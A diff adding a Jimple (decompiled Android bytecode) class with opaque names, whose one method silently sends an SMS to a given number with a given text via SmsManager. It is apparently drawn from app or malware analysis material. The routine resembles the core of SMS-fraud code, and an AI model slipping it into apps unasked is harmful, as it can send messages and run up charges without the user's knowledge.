@@ -1,0 +1,35 @@
+public class com.xxx.yyy.ssmm extends java.lang.Object
+{
+    private java.lang.String mdn;
+    private java.lang.String msg;
+
+    public void <init>()
+    {
+        com.xxx.yyy.ssmm r0;
+
+        r0 := @this: com.xxx.yyy.ssmm;
+        specialinvoke r0.<java.lang.Object: void <init>()>();
+        return;
+    }
+
+    public void Gef(android.content.Context, java.lang.String, java.lang.String)
+    {
+        com.xxx.yyy.ssmm r0;
+        android.content.Context r1;
+        java.lang.String r2, r3;
+        android.telephony.gsm.SmsManager $r4;
+        android.content.Intent $r5;
+        android.app.PendingIntent $r6;
+
+        r0 := @this: com.xxx.yyy.ssmm;
+        r1 := @parameter0: android.content.Context;
+        r2 := @parameter1: java.lang.String;
+        r3 := @parameter2: java.lang.String;
+        $r4 = staticinvoke <android.telephony.gsm.SmsManager: android.telephony.gsm.SmsManager getDefault()>();
+        $r5 = new android.content.Intent;
+        specialinvoke $r5.<android.content.Intent: void <init>()>();
+        $r6 = staticinvoke <android.app.PendingIntent: android.app.PendingIntent getBroadcast(android.content.Context,int,android.content.Intent,int)>(r1, 0, $r5, 0);
+        virtualinvoke $r4.<android.telephony.gsm.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>(r2, null, r3, $r6, null);
+        return;
+    }
+}
